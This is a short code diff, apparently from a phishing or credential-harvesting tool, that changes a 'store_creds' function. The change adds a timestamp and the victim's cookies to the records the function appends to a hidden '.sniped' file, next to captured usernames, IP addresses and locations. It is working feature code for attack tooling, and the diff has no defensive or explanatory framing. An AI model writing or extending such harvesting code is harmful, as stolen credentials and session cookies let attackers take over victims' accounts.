@@ -20,12 +20,14 @@ def store_creds(
     remote_addr,
     city,
     region,
-    zip_code
+    zip_code,
+    time,
+    cookies
 ):
     try:
         with open('.sniped','a') as fh:
             cred_id = str(uuid.uuid4())
-            fh.write('{},{},{},{},{},{},{},{},{},{}\n'.format(
+            fh.write('{},{},{},{},{},{},{},{},{},{},{},{}\n'.format(
                 cred_id,
                 module,
                 user,
@@ -35,7 +37,9 @@ def store_creds(
                 remote_addr,
                 city,
                 region,
-                zip_code
+                zip_code,
+                time,
+                cookies
             ))
     except Exception as ex:
         output.exception(ex)
